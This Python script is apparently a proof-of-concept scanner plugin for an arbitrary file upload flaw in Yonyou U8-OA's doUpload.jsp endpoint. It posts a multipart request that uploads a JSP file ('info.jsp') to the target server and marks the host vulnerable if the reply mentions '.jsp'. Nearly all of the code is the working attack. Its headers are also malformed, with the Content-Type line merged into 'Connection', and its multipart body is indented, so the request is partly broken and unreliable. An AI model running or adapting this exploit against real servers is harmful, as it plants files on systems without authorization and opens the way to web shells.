import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U8-OA协同工作系统doUpload.jsp任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'Connection': 'closeContent-Type: multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75',
        'Upgrade-Insecure-Requests': '1'
    }
    data = '''--7b1db34fff56ef636e9a5cebcd6c9a75
    Content-Disposition: form-data; name="iconFile"; filename="info.jsp"
    Content-Type: application/octet-stream

    <% out.println("tteesstt1"); %>
    --7b1db34fff56ef636e9a5cebcd6c9a75--'''
    vurl = urllib.parse.urljoin(url, "/yyoa/portal/tools/doUpload.jsp")
    try:
        response = requests.post(vurl, headers=headers,data=data)
        if response.status_code == 200 and '.jsp' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult